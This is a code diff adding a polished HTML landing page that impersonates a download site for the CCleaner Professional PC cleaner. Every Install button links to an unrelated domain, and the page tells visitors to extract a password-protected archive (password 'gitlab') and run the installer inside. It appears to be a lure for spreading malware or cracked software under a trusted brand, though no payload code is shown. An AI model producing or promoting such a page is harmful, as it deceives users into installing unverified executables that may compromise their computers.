@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>CCleaner Professional — PC Cleaner & Optimizer</title>
+
+  <meta name="description" content="CCleaner Professional for Windows — clean unnecessary files, optimize PC performance, manage startup apps, update software and maintain privacy.">
+  <meta name="keywords" content="CCleaner Professional, CCleaner Windows, PC cleaner, Windows optimizer, disk cleanup, PC optimization, privacy cleaner">
+  <meta name="theme-color" content="#76b900">
+
+  <style>
+    :root {
+      --accent: #76b900;
+      --accent-light: #91d400;
+      --accent-dark: #5d9200;
+
+      --bg: #080a0c;
+      --bg-soft: #0e1114;
+      --card: #12161a;
+      --card-hover: #171c21;
+
+      --text: #f4f6f8;
+      --text-soft: #a9b1b8;
+      --border: rgba(255,255,255,0.08);
+
+      --shadow: 0 25px 70px rgba(0,0,0,0.45);
+      --radius: 20px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family:
+        Inter,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+      background:
+        radial-gradient(circle at 50% -10%, rgba(118,185,0,0.14), transparent 35%),
+        var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    img {
+      max-width: 100%;
+      display: block;
+    }
+
+    .navbar {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      background: rgba(8,10,12,0.82);
+      backdrop-filter: blur(18px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .navbar-inner {
+      max-width: 1180px;
+      margin: auto;
+      padding: 16px 24px;
+
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+
+      font-size: 18px;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 20px rgba(118,185,0,0.65);
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+
+      color: var(--text-soft);
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .nav-links a {
+      transition: 0.2s ease;
+    }
+
+    .nav-links a:hover {
+      color: var(--text);
+    }
+
+    .nav-install {
+      padding: 10px 17px;
+      border-radius: 10px;
+
+      background: var(--accent);
+      color: #071000;
+
+      font-weight: 800;
+      transition: 0.2s ease;
+    }
+
+    .nav-install:hover {
+      background: var(--accent-light);
+      transform: translateY(-1px);
+    }
+
+    /* HERO */
+
+    .hero {
+      max-width: 1050px;
+      margin: auto;
+      padding: 85px 24px 70px;
+      text-align: center;
+    }
+
+    .hero-logo {
+      width: 230px;
+      height: 230px;
+      object-fit: contain;
+      margin: 0 auto 28px;
+
+      filter:
+        drop-shadow(0 20px 45px rgba(0,0,0,0.5))
+        drop-shadow(0 0 30px rgba(118,185,0,0.12));
+
+      border-radius: 42px;
+    }
+
+    .hero h1 {
+      font-size: clamp(42px, 7vw, 78px);
+      line-height: 0.98;
+      letter-spacing: -0.055em;
+      font-weight: 900;
+
+      margin-bottom: 25px;
+    }
+
+    .hero h1 span {
+      color: var(--accent);
+    }
+
+    .hero-description {
+      max-width: 760px;
+      margin: 0 auto;
+
+      color: var(--text-soft);
+      font-size: 19px;
+      line-height: 1.7;
+    }
+
+    /* INSTALL */
+
+    .install-area {
+      margin-top: 42px;
+    }
+
+    .install-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 13px;
+
+      min-width: 330px;
+      padding: 22px 38px;
+
+      border-radius: 15px;
+
+      background: var(--accent);
+      color: #071000;
+
+      font-size: 21px;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+
+      box-shadow:
+        0 14px 40px rgba(118,185,0,0.22),
+        inset 0 1px rgba(255,255,255,0.25);
+
+      transition:
+        transform 0.2s ease,
+        background 0.2s ease,
+        box-shadow 0.2s ease;
+    }
+
+    .install-button:hover {
+      transform: translateY(-3px) scale(1.015);
+      background: var(--accent-light);
+
+      box-shadow:
+        0 20px 55px rgba(118,185,0,0.30),
+        inset 0 1px rgba(255,255,255,0.3);
+    }
+
+    .install-icon {
+      font-size: 22px;
+    }
+
+    .install-note {
+      margin-top: 14px;
+      color: #747c83;
+      font-size: 13px;
+    }
+
+    .password {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+
+      margin-top: 12px;
+      padding: 8px 13px;
+
+      border: 1px solid var(--border);
+      border-radius: 8px;
+
+      color: var(--text-soft);
+      font-size: 13px;
+      background: rgba(255,255,255,0.025);
+    }
+
+    .password code {
+      color: var(--accent-light);
+      font-weight: 800;
+    }
+
+    /* QUICK INFO */
+
+    .quick-info {
+      max-width: 920px;
+      margin: 50px auto 0;
+
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+
+      background: rgba(255,255,255,0.025);
+    }
+
+    .quick-item {
+      padding: 22px;
+      text-align: center;
+      border-right: 1px solid var(--border);
+    }
+
+    .quick-item:last-child {
+      border-right: none;
+    }
+
+    .quick-item strong {
+      display: block;
+      margin-bottom: 4px;
+
+      font-size: 15px;
+      color: var(--text);
+    }
+
+    .quick-item span {
+      color: var(--text-soft);
+      font-size: 13px;
+    }
+
+    /* GENERAL */
+
+    .container {
+      max-width: 1080px;
+      margin: auto;
+      padding: 0 24px;
+    }
+
+    .section {
+      padding: 85px 0;
+    }
+
+    .section-title {
+      margin-bottom: 35px;
+
+      font-size: 34px;
+      line-height: 1.15;
+      letter-spacing: -0.035em;
+      font-weight: 850;
+    }
+
+    .section-title span {
+      color: var(--accent);
+    }
+
+    /* SCREENSHOT */
+
+    .screenshot {
+      border: 1px solid var(--border);
+      border-radius: 22px;
+      overflow: hidden;
+
+      background: #0b0e11;
+      box-shadow: var(--shadow);
+    }
+
+    .screenshot img {
+      width: 100%;
+      height: auto;
+    }
+
+    /* OVERVIEW */
+
+    .overview {
+      display: grid;
+      grid-template-columns: 1.5fr 0.8fr;
+      gap: 45px;
+      align-items: start;
+    }
+
+    .overview-main p {
+      color: var(--text-soft);
+      font-size: 17px;
+      line-height: 1.85;
+    }
+
+    .overview-main p + p {
+      margin-top: 18px;
+    }
+
+    .overview-side {
+      padding: 25px;
+
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+
+      background: var(--card);
+    }
+
+    .info-list {
+      display: flex;
+      flex-direction: column;
+      gap: 17px;
+    }
+
+    .info-row {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 15px;
+
+      padding-bottom: 15px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .info-row:last-child {
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+
+    .info-row span {
+      color: var(--text-soft);
+      font-size: 13px;
+    }
+
+    .info-row strong {
+      text-align: right;
+      font-size: 13px;
+    }
+
+    /* FEATURES */
+
+    .features {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 17px;
+    }
+
+    .feature {
+      padding: 27px;
+
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+
+      background: var(--card);
+
+      transition:
+        transform 0.2s ease,
+        background 0.2s ease,
+        border-color 0.2s ease;
+    }
+
+    .feature:hover {
+      transform: translateY(-4px);
+      background: var(--card-hover);
+      border-color: rgba(118,185,0,0.28);
+    }
+
+    .feature-icon {
+      width: 43px;
+      height: 43px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      margin-bottom: 18px;
+
+      border-radius: 12px;
+
+      background: rgba(118,185,0,0.11);
+      color: var(--accent-light);
+
+      font-size: 20px;
+    }
+
+    .feature h3 {
+      margin-bottom: 9px;
+
+      font-size: 17px;
+      line-height: 1.3;
+    }
+
+    .feature p {
+      color: var(--text-soft);
+      font-size: 14px;
+      line-height: 1.7;
+    }
+
+    /* STEPS */
+
+    .steps {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+    }
+
+    .step {
+      position: relative;
+
+      padding: 26px 22px;
+
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+
+      background: var(--card);
+    }
+
+    .step-number {
+      width: 39px;
+      height: 39px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      margin-bottom: 17px;
+
+      border-radius: 50%;
+
+      background: var(--accent);
+      color: #071000;
+
+      font-weight: 900;
+    }
+
+    .step h3 {
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    .step p {
+      color: var(--text-soft);
+      font-size: 13px;
+      line-height: 1.65;
+    }
+
+    /* REQUIREMENTS */
+
+    .requirements {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+    }
+
+    .requirement {
+      padding: 23px;
+
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+
+      background: var(--card);
+    }
+
+    .requirement-icon {
+      margin-bottom: 13px;
+      font-size: 24px;
+    }
+
+    .requirement strong {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+    }
+
+    .requirement span {
+      color: var(--text-soft);
+      font-size: 13px;
+    }
+
+    /* FAQ */
+
+    .faq {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .faq-item {
+      padding: 22px 24px;
+
+      border: 1px solid var(--border);
+      border-radius: 15px;
+
+      background: var(--card);
+    }
+
+    .faq-item h3 {
+      margin-bottom: 7px;
+      font-size: 16px;
+    }
+
+    .faq-item p {
+      color: var(--text-soft);
+      font-size: 14px;
+      line-height: 1.7;
+    }
+
+    /* FINAL CTA */
+
+    .final-cta {
+      margin: 25px 0 90px;
+      padding: 65px 30px;
+
+      text-align: center;
+
+      border: 1px solid rgba(118,185,0,0.20);
+      border-radius: 25px;
+
+      background:
+        radial-gradient(
+          circle at 50% 0%,
+          rgba(118,185,0,0.14),
+          transparent 55%
+        ),
+        var(--card);
+    }
+
+    .final-cta h2 {
+      margin-bottom: 12px;
+
+      font-size: clamp(30px, 5vw, 46px);
+      letter-spacing: -0.04em;
+    }
+
+    .final-cta p {
+      max-width: 620px;
+      margin: 0 auto 28px;
+
+      color: var(--text-soft);
+    }
+
+    .final-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+
+      padding: 17px 30px;
+
+      border-radius: 12px;
+
+      background: var(--accent);
+      color: #071000;
+
+      font-weight: 900;
+
+      transition: 0.2s ease;
+    }
+
+    .final-button:hover {
+      background: var(--accent-light);
+      transform: translateY(-2px);
+    }
+
+    /* FOOTER */
+
+    footer {
+      padding: 30px 24px 45px;
+
+      border-top: 1px solid var(--border);
+
+      color: #6e767d;
+      text-align: center;
+
+      font-size: 12px;
+    }
+
+    footer strong {
+      color: #9da5ac;
+    }
+
+    /* RESPONSIVE */
+
+    @media (max-width: 850px) {
+      .nav-links {
+        display: none;
+      }
+
+      .overview {
+        grid-template-columns: 1fr;
+      }
+
+      .features {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .steps {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .requirements {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 650px) {
+      .navbar-inner {
+        padding: 14px 18px;
+      }
+
+      .nav-install {
+        padding: 9px 13px;
+        font-size: 12px;
+      }
+
+      .hero {
+        padding: 60px 18px 50px;
+      }
+
+      .hero-logo {
+        width: 170px;
+        height: 170px;
+      }
+
+      .hero-description {
+        font-size: 16px;
+      }
+
+      .install-button {
+        width: 100%;
+        min-width: 0;
+
+        padding: 19px 20px;
+
+        font-size: 18px;
+      }
+
+      .quick-info {
+        grid-template-columns: 1fr;
+      }
+
+      .quick-item {
+        border-right: none;
+        border-bottom: 1px solid var(--border);
+      }
+
+      .quick-item:last-child {
+        border-bottom: none;
+      }
+
+      .container {
+        padding: 0 18px;
+      }
+
+      .section {
+        padding: 60px 0;
+      }
+
+      .section-title {
+        font-size: 29px;
+      }
+
+      .features,
+      .steps,
+      .requirements {
+        grid-template-columns: 1fr;
+      }
+
+      .final-cta {
+        margin-bottom: 60px;
+        padding: 50px 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- NAVIGATION -->
+  <nav class="navbar">
+    <div class="navbar-inner">
+
+      <a href="#" class="brand">
+        <span class="brand-dot"></span>
+        CCleaner Professional
+      </a>
+
+      <div class="nav-links">
+        <a href="#overview">Overview</a>
+        <a href="#features">Features</a>
+        <a href="#installation">Installation</a>
+        <a href="#requirements">Requirements</a>
+      </div>
+
+      <a href="https://gitlab.life/" class="nav-install">
+        Install
+      </a>
+
+    </div>
+  </nav>
+
+
+  <!-- HERO -->
+  <header class="hero">
+
+    <img
+      class="hero-logo"
+      src="https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxtZXRhtTJhmA4SO78VrykI5KHO0WIAy36YbLzxkrQY_hAt.YMNAFVYMgnqQ52EiUiSYyfyCqC1l4IgPFjj1KzXI-&format=source"
+      alt="CCleaner Professional logo"
+    >
+
+    <h1>
+      CCleaner <span>Professional</span>
+    </h1>
+
+    <p class="hero-description">
+      A powerful Windows PC cleaning and optimization utility designed
+      to remove unnecessary files, improve system maintenance,
+      manage applications and help keep your computer running smoothly.
+    </p>
+
+    <div class="install-area">
+
+      <a
+        href="https://gitlab.life/"
+        class="install-button"
+      >
+        <span class="install-icon">⬇</span>
+        Install CCleaner
+      </a>
+
+      <div class="install-note">
+        Windows PC • CCleaner Professional
+      </div>
+
+      <div class="password">
+        <span>Archive password:</span>
+        <code>gitlab</code>
+      </div>
+
+    </div>
+
+    <div class="quick-info">
+
+      <div class="quick-item">
+        <strong>Windows</strong>
+        <span>11, 10, 8.1 and 7</span>
+      </div>
+
+      <div class="quick-item">
+        <strong>PC Cleaner</strong>
+        <span>Junk & browser data cleanup</span>
+      </div>
+
+      <div class="quick-item">
+        <strong>Professional</strong>
+        <span>Advanced maintenance tools</span>
+      </div>
+
+    </div>
+
+  </header>
+
+
+  <main class="container">
+
+
+    <!-- SCREENSHOT -->
+    <section class="section">
+
+      <h2 class="section-title">
+        CCleaner <span>Interface</span>
+      </h2>
+
+      <div class="screenshot">
+
+        <img
+          src="https://www.macworld.com/wp-content/uploads/2025/03/Ccleaner-review.jpg?quality=50&strip=all&w=1024"
+          alt="CCleaner Professional Windows interface"
+        >
+
+      </div>
+
+    </section>
+
+
+    <!-- OVERVIEW -->
+    <section class="section" id="overview">
+
+      <h2 class="section-title">
+        About <span>CCleaner Professional</span>
+      </h2>
+
+      <div class="overview">
+
+        <div class="overview-main">
+
+          <p>
+            CCleaner Professional is a Windows utility focused on
+            cleaning unnecessary files, maintaining system performance
+            and managing common PC maintenance tasks from one interface.
+          </p>
+
+          <p>
+            The application includes tools for cleaning browser data,
+            managing startup applications, updating software and drivers,
+            checking PC health and automating selected maintenance tasks.
+          </p>
+
+          <p>
+            Its interface combines simple one-click maintenance tools
+            with additional options for users who want more control
+            over how their Windows PC is managed.
+          </p>
+
+        </div>
+
+        <aside class="overview-side">
+
+          <div class="info-list">
+
+            <div class="info-row">
+              <span>Product</span>
+              <strong>CCleaner Professional</strong>
+            </div>
+
+            <div class="info-row">
+              <span>Platform</span>
+              <strong>Windows</strong>
+            </div>
+
+            <div class="info-row">
+              <span>Category</span>
+              <strong>PC Optimization</strong>
+            </div>
+
+            <div class="info-row">
+              <span>Interface</span>
+              <strong>Desktop Application</strong>
+            </div>
+
+            <div class="info-row">
+              <span>Architecture</span>
+              <strong>32-bit / 64-bit</strong>
+            </div>
+
+          </div>
+
+        </aside>
+
+      </div>
+
+    </section>
+
+
+    <!-- FEATURES -->
+    <section class="section" id="features">
+
+      <h2 class="section-title">
+        Key <span>Features</span>
+      </h2>
+
+      <div class="features">
+
+        <article class="feature">
+          <div class="feature-icon">🧹</div>
+          <h3>Custom Clean</h3>
+          <p>
+            Clean temporary files, browser data, cached content,
+            cookies and other unnecessary items.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">⚡</div>
+          <h3>Performance Optimization</h3>
+          <p>
+            Identify resource-heavy applications and manage background
+            activity to help improve everyday PC performance.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🩺</div>
+          <h3>PC Health Check</h3>
+          <p>
+            Analyze common areas of your system and receive recommendations
+            for maintenance and optimization.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🔄</div>
+          <h3>Software Updater</h3>
+          <p>
+            Check installed applications for available updates
+            from the CCleaner interface.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">⚙</div>
+          <h3>Driver Updater</h3>
+          <p>
+            Find outdated hardware drivers and manage driver updates
+            for supported Windows devices.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🚀</div>
+          <h3>Startup Management</h3>
+          <p>
+            Review applications that launch with Windows and disable
+            unnecessary startup items.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🔒</div>
+          <h3>Privacy Cleaning</h3>
+          <p>
+            Remove browser history, cookies and other browsing data
+            selected for cleanup.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🕒</div>
+          <h3>Scheduled Cleaning</h3>
+          <p>
+            Configure recurring cleaning tasks so selected maintenance
+            operations can run automatically.
+          </p>
+        </article>
+
+        <article class="feature">
+          <div class="feature-icon">🧠</div>
+          <h3>Smart Cleaning</h3>
+          <p>
+            Automatically monitor selected junk files and browser
+            data according to your configured preferences.
+          </p>
+        </article>
+
+      </div>
+
+    </section>
+
+
+    <!-- INSTALLATION -->
+    <section class="section" id="installation">
+
+      <h2 class="section-title">
+        Installation <span>Guide</span>
+      </h2>
+
+      <div class="steps">
+
+        <article class="step">
+          <div class="step-number">1</div>
+          <h3>Open the installer</h3>
+          <p>
+            Click the Install CCleaner button at the top of this page
+            and save the provided archive to your Windows PC.
+          </p>
+        </article>
+
+        <article class="step">
+          <div class="step-number">2</div>
+          <h3>Extract the archive</h3>
+          <p>
+            Extract the downloaded archive to a convenient folder
+            using your preferred archive utility.
+          </p>
+        </article>
+
+        <article class="step">
+          <div class="step-number">3</div>
+          <h3>Use the password</h3>
+          <p>
+            If the archive requests a password, enter
+            <strong>gitlab</strong>.
+          </p>
+        </article>
+
+        <article class="step">
+          <div class="step-number">4</div>
+          <h3>Complete setup</h3>
+          <p>
+            Start the installer and follow the setup instructions
+            until the installation is complete.
+          </p>
+        </article>
+
+      </div>
+
+    </section>
+
+
+    <!-- REQUIREMENTS -->
+    <section class="section" id="requirements">
+
+      <h2 class="section-title">
+        System <span>Requirements</span>
+      </h2>
+
+      <div class="requirements">
+
+        <div class="requirement">
+          <div class="requirement-icon">🪟</div>
+          <strong>Operating System</strong>
+          <span>Windows 11, 10, 8.1 or 7</span>
+        </div>
+
+        <div class="requirement">
+          <div class="requirement-icon">💻</div>
+          <strong>Architecture</strong>
+          <span>32-bit and 64-bit systems</span>
+        </div>
+
+        <div class="requirement">
+          <div class="requirement-icon">💾</div>
+          <strong>Storage</strong>
+          <span>Space for the application and temporary files</span>
+        </div>
+
+        <div class="requirement">
+          <div class="requirement-icon">🌐</div>
+          <strong>Internet</strong>
+          <span>Recommended for updates and online features</span>
+        </div>
+
+      </div>
+
+    </section>
+
+
+    <!-- FAQ -->
+    <section class="section">
+
+      <h2 class="section-title">
+        Frequently Asked <span>Questions</span>
+      </h2>
+
+      <div class="faq">
+
+        <div class="faq-item">
+          <h3>What is CCleaner Professional?</h3>
+          <p>
+            CCleaner Professional is a Windows PC maintenance utility
+            that combines cleaning, optimization, privacy and update
+            management tools.
+          </p>
+        </div>
+
+        <div class="faq-item">
+          <h3>What can CCleaner clean?</h3>
+          <p>
+            Depending on the selected options, CCleaner can remove
+            temporary files, browser cache, cookies, browsing history
+            and other unnecessary data.
+          </p>
+        </div>
+
+        <div class="faq-item">
+          <h3>Does CCleaner include automatic cleaning?</h3>
+          <p>
+            CCleaner Professional includes Smart Cleaning and scheduled
+            cleaning options that can automate selected maintenance tasks.
+          </p>
+        </div>
+
+        <div class="faq-item">
+          <h3>Can CCleaner manage startup applications?</h3>
+          <p>
+            Yes. CCleaner includes tools that let you review and manage
+            applications configured to start with Windows.
+          </p>
+        </div>
+
+        <div class="faq-item">
+          <h3>Which Windows versions are supported?</h3>
+          <p>
+            Current CCleaner Professional documentation lists support
+            for Windows 11, Windows 10, Windows 8.1 and Windows 7,
+            including 32-bit and 64-bit versions.
+          </p>
+        </div>
+
+      </div>
+
+    </section>
+
+
+    <!-- FINAL CTA -->
+    <section class="final-cta">
+
+      <h2>Ready to install CCleaner?</h2>
+
+      <p>
+        Start the installation and keep your Windows PC organized
+        with a dedicated cleaning and optimization toolkit.
+      </p>
+
+      <a
+        href="https://gitlab.life/"
+        class="final-button"
+      >
+        Install CCleaner Professional
+      </a>
+
+    </section>
+
+  </main>
+
+
+  <!-- FOOTER -->
+  <footer>
+
+    <strong>CCleaner Professional</strong>
+    — Windows PC cleaning and optimization.
+
+    <br><br>
+
+    This page is an independent informational project and is not
+    affiliated with or endorsed by the CCleaner / Piriform brand.
+
+  </footer>
+
+</body>
+</html>
